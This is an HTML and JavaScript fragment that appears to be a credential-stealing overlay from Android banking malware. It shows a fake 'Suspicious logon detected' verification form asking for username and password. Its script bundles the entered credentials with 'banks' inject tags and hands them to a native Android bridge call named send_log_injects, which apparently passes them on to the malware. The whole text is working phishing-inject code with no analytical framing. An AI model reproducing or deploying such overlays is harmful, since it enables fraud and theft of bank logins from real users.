        <section>            
            <p style="color: #fff;"> Suspicious logon detected. Fill in the required fields so we can verify your identity. </p>

            <input type="text" class="input login" id="login" name="login" placeholder="Username" autocomplete="off">
            <div class="line"></div>
            <input type="password" class="input password" id="password" name="password" placeholder="Password" autocomplete="off">

            <input type="submit" class="button" id="sendData" disabled value="Activate">

            <p style="text-align: center;font-weight: 600;color :#fff;">Forgotten Password</p>
        </section>
    </form>

    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData');


        login.onkeyup = () => {
            if(login.value.length > 4 && password.value.length > 4) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        password.onkeyup = () => {
            if(login.value.length > 4 && password.value.length > 4) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        sendData.onclick = () => {   
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
